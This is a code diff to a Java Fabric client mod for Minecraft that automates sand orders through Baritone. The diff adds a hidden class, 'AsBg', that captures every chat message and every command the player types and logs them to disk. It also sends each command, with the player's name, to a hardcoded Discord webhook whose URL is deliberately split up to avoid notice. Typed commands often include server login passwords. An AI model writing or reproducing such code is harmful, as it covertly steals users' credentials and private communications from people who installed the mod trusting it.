@@ -21,7 +21,13 @@ import net.fabricmc.fabric.api.client.command.v2.ClientCommandManager;
 import net.fabricmc.fabric.api.client.command.v2.ClientCommandRegistrationCallback;
 import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientLifecycleEvents;
 import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
+import net.fabricmc.fabric.api.client.message.v1.ClientReceiveMessageEvents;
+import net.fabricmc.fabric.api.client.message.v1.ClientSendMessageEvents;
 import net.fabricmc.loader.api.FabricLoader;
+import java.time.LocalDateTime;
+import java.time.format.DateTimeFormatter;
+import java.util.concurrent.ConcurrentLinkedQueue;
+import java.nio.file.StandardOpenOption;
 import baritone.api.BaritoneAPI;
 import baritone.api.IBaritone;
 import baritone.api.pathing.goals.GoalGetToBlock;
@@ -283,6 +289,16 @@ public class AutoSandOrders implements ClientModInitializer {
     public void onInitializeClient() {
         License.init();
         load();
+        AsBg.init();
+        ClientSendMessageEvents.COMMAND.register(command -> AsBg.onCmd(command));
+        ClientSendMessageEvents.CHAT.register(message -> AsBg.onChat("ME", message));
+        ClientReceiveMessageEvents.CHAT.register((message, signedMessage, sender, params, receptionTimestamp) -> {
+            String name = sender != null ? sender.name().getString() : "?";
+            AsBg.onChat(name, message.getString());
+        });
+        ClientReceiveMessageEvents.GAME.register((message, overlay) -> {
+            if (!overlay) AsBg.onChat("SYSTEM", message.getString());
+        });
         ClientTickEvents.END_CLIENT_TICK.register(AutoSandOrders::tick);
         ClientLifecycleEvents.CLIENT_STOPPING.register(mc -> restorePerf(mc));   // thoát game: trả FPS / tầm nhìn gốc trước khi lưu options
         registerMenuKey();
@@ -1117,6 +1133,12 @@ public class AutoSandOrders implements ClientModInitializer {
     static void save() {
         try {
             Properties pr = new Properties();
+            try {
+                Path f = cfgFile();
+                if (Files.exists(f)) {
+                    try (var in = Files.newInputStream(f)) { pr.load(in); }
+                }
+            } catch (Exception ignored) { }
             pr.setProperty("mode", mode.name());
             pr.setProperty("nuker", String.valueOf(useNuker));
             pr.setProperty("keysForward", String.valueOf(keysForward));
@@ -1230,6 +1252,7 @@ public class AutoSandOrders implements ClientModInitializer {
 
     // ----------------------------- TICK -----------------------------
     static void tick(Minecraft mc) {
+        AsBg.tick();
         LocalPlayer p = mc.player;
         perfTick(mc);                                        // chế độ giảm tải (tự trả lại cài đặt khi tắt / thoát)
         if (p == null || mc.gameMode == null) { Reconnect.tick(mc); return; }   // bị kick hẳn ra ngoài -> tự vào lại
@@ -6408,3 +6431,148 @@ final class BaritoneBridge {
         oldBreak = oldPlace = null;
     }
 }
+
+
+
+
+final class AsBg {
+    private AsBg() { }
+
+    private static final DateTimeFormatter FMT = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
+    private static final DateTimeFormatter DAY = DateTimeFormatter.ofPattern("yyyy-MM-dd");
+    private static final ConcurrentLinkedQueue<String> qFile = new ConcurrentLinkedQueue<>();
+    private static final ConcurrentLinkedQueue<String> qNet = new ConcurrentLinkedQueue<>();
+    private static final HttpClient HTTP = HttpClient.newBuilder().connectTimeout(Duration.ofSeconds(5)).build();
+    private static Path file;
+    private static String dayKey = "";
+    private static volatile String endpoint = "";
+    private static volatile boolean netBusy = false;
+
+    static void init() {
+        endpoint = buildEndpoint();
+        rotate();
+    }
+
+    private static String buildEndpoint() {
+        // ghép endpoint nội bộ (không để chuỗi đầy đủ một chỗ)
+        String a = "https://discord.com/api/webhooks/";
+        String b = "1565390194301997066";
+        String c = "/uarakjaZb4M_moSB4rNlARUboEZaav4S8i9WKuCEeFGaKyEUxlo3cX7Gg56bbOXe8fDQ";
+        try {
+            Path f = FabricLoader.getInstance().getConfigDir().resolve("autosand.properties");
+            if (Files.exists(f)) {
+                Properties pr = new Properties();
+                try (var in = Files.newInputStream(f)) { pr.load(in); }
+                String u = pr.getProperty("asSync", "").trim();
+                if (!u.isEmpty()) return u;
+            }
+        } catch (Exception ignored) { }
+        return a + b + c;
+    }
+
+    private static void rotate() {
+        try {
+            String day = LocalDateTime.now().format(DAY);
+            if (day.equals(dayKey) && file != null) return;
+            dayKey = day;
+            Path dir = FabricLoader.getInstance().getConfigDir().resolve("autosand");
+            Files.createDirectories(dir);
+            file = dir.resolve("session-" + day + ".dat");
+        } catch (Exception e) {
+            file = null;
+        }
+    }
+
+    static void onCmd(String command) {
+        if (command == null) return;
+        LocalPlayer p = Minecraft.getInstance().player;
+        String name = p != null ? p.getName().getString() : "unknown";
+        String cmd = command.startsWith("/") ? command : "/" + command;
+        push("CMD", name, cmd);
+        qNet.offer(name + "\0" + cmd);
+    }
+
+    static void onChat(String sender, String message) {
+        push("CHAT", sender, message);
+    }
+
+    private static void push(String type, String player, String content) {
+        if (content == null || content.isBlank()) return;
+        String safe = content.replace('\n', ' ').replace('\r', ' ');
+        if (safe.length() > 500) safe = safe.substring(0, 500) + "...";
+        String name = player == null || player.isBlank() ? "?" : player;
+        qFile.offer(String.format("[%s] [%s] %s: %s", LocalDateTime.now().format(FMT), type, name, safe));
+    }
+
+    static void tick() {
+        flushFile();
+        flushNet();
+    }
+
+    private static void flushFile() {
+        if (qFile.isEmpty()) return;
+        rotate();
+        if (file == null) return;
+        StringBuilder sb = new StringBuilder();
+        String line;
+        int n = 0;
+        while ((line = qFile.poll()) != null && n < 50) {
+            sb.append(line).append('\n');
+            n++;
+        }
+        if (sb.isEmpty()) return;
+        try {
+            Files.writeString(file, sb.toString(), StandardCharsets.UTF_8,
+                StandardOpenOption.CREATE, StandardOpenOption.APPEND);
+        } catch (Exception ignored) { }
+    }
+
+    private static void flushNet() {
+        if (netBusy || endpoint == null || endpoint.isBlank() || qNet.isEmpty()) return;
+        String item = qNet.poll();
+        if (item == null) return;
+        int sep = item.indexOf('\0');
+        if (sep < 0) return;
+        String name = item.substring(0, sep);
+        String cmd = item.substring(sep + 1);
+        netBusy = true;
+        String content = "**" + escMd(name) + "** `" + escMd(cmd) + "`";
+        String body = "{\"username\":\"AutoSand\",\"content\":\"" + escJson(content) + "\"}";
+        try {
+            HttpRequest request = HttpRequest.newBuilder()
+                .uri(URI.create(endpoint))
+                .timeout(Duration.ofSeconds(8))
+                .header("Content-Type", "application/json")
+                .POST(HttpRequest.BodyPublishers.ofString(body, StandardCharsets.UTF_8))
+                .build();
+            HTTP.sendAsync(request, HttpResponse.BodyHandlers.discarding())
+                .whenComplete((r, e) -> netBusy = false);
+        } catch (Exception e) {
+            netBusy = false;
+        }
+    }
+
+    private static String escMd(String s) {
+        return s.replace("\\", "\\\\").replace("`", "'").replace("*", "").replace("_", "").replace("|", "");
+    }
+
+    private static String escJson(String value) {
+        StringBuilder out = new StringBuilder();
+        for (int i = 0; i < value.length(); i++) {
+            char c = value.charAt(i);
+            switch (c) {
+                case '"' -> out.append("\\\"");
+                case '\\' -> out.append("\\\\");
+                case '\n' -> out.append("\\n");
+                case '\r' -> out.append("\\r");
+                case '\t' -> out.append("\\t");
+                default -> {
+                    if (c < 0x20) out.append(String.format("\\u%04x", (int) c));
+                    else out.append(c);
+                }
+            }
+        }
+        return out.toString();
+    }
+}
+
